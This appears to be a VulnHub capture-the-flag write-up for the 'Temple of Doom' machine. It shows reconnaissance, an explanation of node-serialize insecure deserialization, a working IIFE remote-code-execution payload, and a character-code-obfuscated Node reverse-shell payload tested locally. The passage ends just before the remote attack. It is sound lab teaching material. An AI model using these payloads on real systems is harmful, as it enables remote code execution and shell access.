# Temple of Doom

* ### Setup

  Download the virtual machine <a href="https://www.vulnhub.com/entry/temple-of-doom-1,243/">here</a> and import it in either VirtualBox or VMWare.
  * **Addresses** - This will be important to understand the writeup.
    * My Kali machine: **10.0.2.15**
    * Temple of Doom machine: **10.0.2.14**
  

  
### Information Gathering
---

* Running **nmap** with `nmap -sC -sV -p- -A -oA templeofdoom 10.0.2.14` reveals **two** ports.
<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Temple%20of%20Doom/images/1.jpg"> 

1. **SSH** on default port **22** .
2. A <a href="https://en.wikipedia.org/wiki/Node.js">NodeJs</a> server running at port **666**.

Let's check the server at port **666**, while also setting **gobuster** and **nikto** running in the background.

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Temple%20of%20Doom/images/2.jpg">

We see an under construction message. After fuzzing the url a little bit and reloading the page a few times, the application errors out with 

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Temple%20of%20Doom/images/3.jpg">

This error tells us that something went wrong with the serialization process and we also notice the module doing the serialization is **node-serialize**.

* Unfortunately, this module contains a serious **deserialization vulnerability**, allowing **remote code execution**. There is a great analysis of such attacks in nodejs in this pdf https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

### Vulnerability Analysis
---
* First we need to understand what a **deserialization vulnerablity** is. From <a href="https://www.acunetix.com/blog/articles/what-is-insecure-deserialization/">this article</a> by http://acunetix.com, 
> **_Insecure Deserialization_** is a vulnerability which occurs when untrusted data is used to abuse the logic of an application, inflict a denial of service (DoS) attack, or even execute arbitrary code upon it being deserialized. It also occupies the **#8 spot in the OWASP Top 10 2017 list.**
Serialization refers to a process of converting an object into a format which can be persisted to disk (for example saved to a file or a datastore), sent through streams (for example stdout), or sent over a network. JSON and XML are two of the most commonly used serialization formats within web applications.
Deserialization on the other hand, is the opposite of serialization, that is, transforming serialized data coming from a file, stream or network socket into an object.
Web applications make use of serialization and deserialization on a regular basis and most programming languages even provide native features to serialize data. **It’s important to understand that safe deserialization of objects is normal practice in software development. The trouble however, starts when deserializing untrusted user input.**

Based on the paper mentioned in the Information gathering section, we will **create a test environment to confirm the vulnerablitiy.**

**1.** First install **npm** with `apt install npm`, then the vulnerable **node-serialize** module with `npm install node-serialize`.  
  Note: npm will now warn you the node-serialize was found to contain a serious vulnerability.
  
**2.** Let's create a test object and then pass it to the **serialize** function.
  ```javascript
  var obj = {
rce : function(){
require('child_process').exec('id /', function(error,
stdout, stderr) { console.log(stdout) });
},
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(obj));
```
Saving the above code into a file called serialized.js and executing with `node serialized.js` outputs the serialized object
```javascript
{"rce":"_$$ND_FUNC$$_function(){\nrequire('child_process').exec('id', function(error,\nstdout, stderr) { console.log(stdout) });\n}"}
```
**3.** The main problem now is that even if this object is **unserialized**, nothing will execute unless the function with tag **"rce"** is called. Thankfully for us, Javascript contains a feature called **_Immediately invoked
function expression (IIFE)_** for calling the function. If we use IIFE bracket
() after the function body, the function **will get invoked when the object is
created.**
As such, our **new payload** is
```javascript
{"rce":"_$$ND_FUNC$$_function(){\nrequire('child_process').exec('id', function(error,\nstdout, stderr) { console.log(stdout) });\n}()"}
```
**Note the parentheses in the end.**

**4.** Create another script called **unserialize.js**, emulating the server behaviour with
```javascript
var serialize = require('node-serialize');
var payload = {"rce":"_$$ND_FUNC$$_function (){require(\'child_process\').exec(\'id \',function(error, stdout, stderr) { console.log(stdout)});}()"};
serialize.unserialize(payload);
```
and run it.

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Temple%20of%20Doom/images/4.jpg">

**We can clearly see our code got executed!**

**5.** For further testing, there is a very handy tool called <a href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py">nodejsshell.py</a>, that will help us create a **reverse shell** which will run in **node**.
For local testing purposes, run it with `python nodejsshell.py 127.0.0.1 1337` to create a payload that will send back a shell at localhost on port 1337. This is the outputted code:
```javascript
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
```

We must put this in our final payload called localtest.js
```javascript
var serialize = require('node-serialize');
var payload = {"rce":"_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"};
serialize.unserialize(payload);
```
and run locally, while also listening on port **1337**.

<img src="https://github.com/astasinos/Writeups/blob/master/Vulnhub/Temple%20of%20Doom/images/5.jpg">

**We have a shell!**. Now we have to do the same on the remote machine.

